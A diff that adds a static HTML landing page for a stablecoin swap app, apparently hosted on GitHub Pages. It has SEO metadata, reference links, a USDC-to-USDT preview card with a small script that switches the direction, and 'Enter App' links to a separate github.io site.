@@ -1,1 +1,117 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Stablecoin Swap</title>
+  <meta name="description" content="Stablecoin Swap swaps between stablecoins from your own wallet; peg and depeg risk exists.">
+  <link rel="canonical" href="https://stablecoin-swap.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#070A0D">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Stablecoin Swap">
+  <meta property="og:description" content="Stablecoin Swap swaps between stablecoins from your own wallet; peg and depeg risk exists.">
+  <meta property="og:url" content="https://stablecoin-swap.github.io/">
+  <meta property="og:image" content="https://stablecoin-swap.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Stablecoin Swap">
+  <meta name="twitter:description" content="Stablecoin Swap swaps between stablecoins from your own wallet; peg and depeg risk exists.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://stablecoin-swap.github.io/#website",
+        "url": "https://stablecoin-swap.github.io/",
+        "name": "Stablecoin Swap",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://stablecoin-swap.github.io/#organization",
+        "name": "Stablecoin Swap",
+        "url": "https://stablecoin-swap.github.io/",
+        "logo": "https://stablecoin-swap.github.io/favicon.png"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://stablecoin-swap.github.io/#app",
+        "name": "Stablecoin Swap",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://stablecoin-swap.github.io/",
+        "isAccessibleForFree": true
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="#" aria-label="Stablecoin Swap home">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Stablecoin Swap</span>
+    </a>
+    <nav class="nav" aria-label="Stablecoin references">
+      <a href="https://www.circle.com/usdc" target="_blank" rel="nofollow noopener noreferrer">Circle USDC</a>
+      <a href="https://ethereum.org/stablecoins/" target="_blank" rel="nofollow noopener noreferrer">Ethereum</a>
+      <a href="https://www.coingecko.com/en/categories/stablecoins" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
+    </nav>
+    <span class="spacer" aria-hidden="true"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
 
+  <main class="stage">
+    <section class="hero" aria-labelledby="page-title">
+      <h1 id="page-title">Stablecoin Swap</h1>
+      <p class="sub"><strong>Stablecoin Swap</strong> swaps between stablecoins from your own wallet; peg and depeg risk exists.</p>
+    </section>
+
+    <section class="swap-card" aria-label="Stablecoin swap preview">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img class="token" src="usdc.png" width="30" height="30" alt="USDC">
+            <span class="ticker">USDC</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
+          <span aria-hidden="true">-&gt;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img class="token" src="usdt.png" width="30" height="30" alt="USDT">
+            <span class="ticker">USDT</span>
+          </span>
+        </div>
+      </div>
+      <a class="enter" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+      <p class="note">Preview only</p>
+    </section>
+  </main>
+
+  <footer class="foot">Stablecoin Swap &mdash; 2026</footer>
+
+  <script>
+  (function(){
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function(){
+      var chips = document.querySelectorAll(".leg .chip");
+      if (chips.length < 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
